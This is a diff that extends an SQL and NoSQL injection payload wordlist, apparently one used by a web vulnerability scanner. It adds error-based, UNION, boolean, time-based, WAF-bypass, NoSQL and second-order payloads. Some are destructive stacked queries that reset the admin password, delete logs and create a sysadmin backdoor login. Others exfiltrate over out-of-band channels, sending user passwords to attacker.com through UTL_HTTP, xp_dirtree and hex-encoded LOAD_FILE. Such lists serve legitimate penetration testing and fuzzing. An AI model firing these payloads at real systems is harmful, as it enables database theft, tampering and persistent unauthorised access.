@@ -317,3 +317,145 @@ id=1;SELECT 1&id=1
 %2527%2520OR%25201%253D1
 %27%20OR%20%271%27%3D%271--
 %2560%2520OR%2520%25601%2560%253D%25601
+
+# ── ERROR-BASED SQLite ──
+' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS INTEGER)--
+' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END FROM sqlite_master)--
+' AND randomblob(100000000)--
+' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000/2))))--
+
+# ── ERROR-BASED MariaDB ──
+' AND extractvalue(0x0a,concat(0x0a,(SELECT database())))--
+' AND updatexml(0x0a,concat(0x0a,(SELECT database())),0x0a)--
+' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),floor(rand(0)*2))a FROM information_schema.tables GROUP BY a)b)--
+' AND ST_LatFromGeoHash((SELECT hex(user())))--
+' AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT * FROM(SELECT database())a)b))--
+
+# ── UNION COLUMN ENUMERATION (1-10) ──
+' UNION SELECT NULL-- -
+' UNION SELECT NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+' UNION SELECT 1-- -
+' UNION SELECT 1,2-- -
+' UNION SELECT 1,2,3-- -
+' UNION SELECT 1,2,3,4-- -
+' UNION SELECT 1,2,3,4,5-- -
+' UNION SELECT 1,2,3,4,5,6-- -
+' UNION SELECT 1,2,3,4,5,6,7-- -
+' UNION SELECT 1,2,3,4,5,6,7,8-- -
+' UNION SELECT 1,2,3,4,5,6,7,8,9-- -
+' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- -
+
+# ── BOOLEAN-BASED CASE WHEN ──
+' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1--
+' AND CASE WHEN (1=2) THEN 1 ELSE 0 END=1--
+' AND CASE WHEN (username='admin') THEN 1 ELSE 0 END=1 FROM users LIMIT 1--
+' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1--
+' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1--
+1 AND CASE WHEN 1=1 THEN 1 ELSE 2 END=1
+1 AND CASE WHEN 1=2 THEN 1 ELSE 2 END=1
+' OR CASE WHEN 1=1 THEN 1 ELSE 0 END--
+' OR CASE WHEN 1=2 THEN 1 ELSE 0 END--
+
+# ── TIME-BASED: BENCHMARK / HEAVY QUERIES ──
+' AND BENCHMARK(10000000,MD5('a'))--
+' OR BENCHMARK(10000000,SHA1('a'))--
+' AND BENCHMARK(5000000,SHA1(1))--
+1 AND BENCHMARK(5000000,MD5('test'))--
+' AND (SELECT CASE WHEN (1=1) THEN BENCHMARK(5000000,MD5('a')) ELSE 0 END)--
+' AND IF(1=1,BENCHMARK(5000000,MD5('a')),0)--
+' UNION SELECT BENCHMARK(10000000,MD5(1))--
+
+# ── STACKED QUERIES EXTENDED ──
+'; INSERT INTO users(id,username,password) VALUES(9999,'wshack','wshack')--
+'; UPDATE users SET password=MD5('hacked') WHERE username='admin'--
+'; DELETE FROM logs WHERE 1=1--
+'; CREATE TABLE backdoor(cmd text)--
+'; DROP TABLE IF EXISTS backdoor--
+'; TRUNCATE TABLE sessions--
+'; ALTER TABLE users ADD COLUMN backdoor text--
+'; EXEC sp_addlogin 'ws_backdoor','P@ss1234'--
+'; EXEC sp_addsrvrolemember 'ws_backdoor','sysadmin'--
+
+# ── OUT-OF-BAND: DNS VIA MYSQL ──
+' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT password FROM users LIMIT 1),0x2e,0x6174746163,0x6b65722e,0x636f6d5c5c61))--
+' AND 1=2 UNION ALL SELECT 1,LOAD_FILE(0x2f2f6174746163 6b65722e636f6d2f),3--
+' AND (SELECT count(*) FROM(SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY concat((SELECT database()),FLOOR(RAND(0)*2)) HAVING MIN(0))--
+
+# ── OUT-OF-BAND: UTL_HTTP (Oracle) ──
+' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--
+' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/?x='||user) FROM dual--
+'; BEGIN UTL_HTTP.REQUEST('http://attacker.com/?x='||user); END;--
+' AND 1=(SELECT UTL_HTTP.REQUEST('http://attacker.com/'||banner) FROM v$version WHERE rownum=1)--
+
+# ── OUT-OF-BAND: xp_dirtree (MSSQL) ──
+'; EXEC master..xp_dirtree '\\attacker.com\a'--
+'; DECLARE @v varchar(1024); SET @v=(SELECT TOP 1 password FROM users); EXEC master..xp_dirtree '\\'+@v+'.attacker.com\a'--
+'; EXEC master..xp_fileexist '\\attacker.com\b'--
+'; EXEC master..xp_subdirs '\\attacker.com\c'--
+
+# ── WAF BYPASS: COMMENT INJECTION ──
+' /*!UNION*/ /*!SELECT*/ 1,2,3--
+'/*!50000union*//*!50000select*/1,2,3--
+' UNION/*aaaa*/SELECT/*bbbb*/1,2,3--
+' UNION#aaaa%0ASELECT 1,2,3--
+'%0AUNION%0ASELECT%0A1,2,3--
+' UNION%00SELECT 1,2,3--
+'%20UNION%20SELECT%201,2,3%20--%20
+'%09UNION%09SELECT%091,2,3--
+' UN\x00ION SELECT 1,2,3--
+
+# ── WAF BYPASS: HEX ENCODING ──
+' UNION SELECT 0x61646d696e,0x70617373776f7264,0x33--
+' AND 0x31=0x31--
+' AND 0x31=0x32--
+' OR 0x61='a'--
+1 UNION SELECT 0x414243,0x444546,0x47484950--
+' AND hex(database())=hex(database())--
+' AND 0x27=char(39)--
+
+# ── NoSQL INJECTION (MongoDB) ──
+{"$gt": ""}
+{"$ne": null}
+{"$ne": "x"}
+{"$in": ["admin","root","user"]}
+{"$regex": ".*"}
+{"$where": "this.password.length > 0"}
+{"$where": "sleep(3000)"}
+{"$where": "1==1"}
+{"$where": "function(){return true}"}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": "admin", "password": {"$ne": "wrong"}}
+{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
+admin' && '1'=='1
+admin' || '1'=='1
+username[$ne]=x&password[$ne]=x
+username[$gt]=&password[$gt]=
+username[$regex]=.*&password[$regex]=.*
+username[$exists]=true&password[$exists]=true
+
+# ── SECOND-ORDER INJECTION EXTENDED ──
+ws_2nd_' OR SLEEP(3)--
+ws_2nd_" OR SLEEP(3)--
+ws_2nd_'; EXEC xp_cmdshell('whoami')--
+ws_2nd_' UNION SELECT NULL,NULL,NULL--
+ws_2nd_' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--
+ws_2nd_'; SELECT pg_sleep(3)--
+ws_2nd_') OR ('1'='1
+
+# ── WAF BYPASS: URL/UNICODE ENCODING ──
+%27%20OR%20%271%27%3d%271
+%27+OR+%271%27%3d%271
+%27 OR %271%27%3d%271
+'+OR+'1'='1
+%2527+OR+%25271%2527%253d%25271
+\x27 OR \x271\x27=\x271
+' OR '1'='1
+&#x27; OR &#x27;1&#x27;=&#x27;1
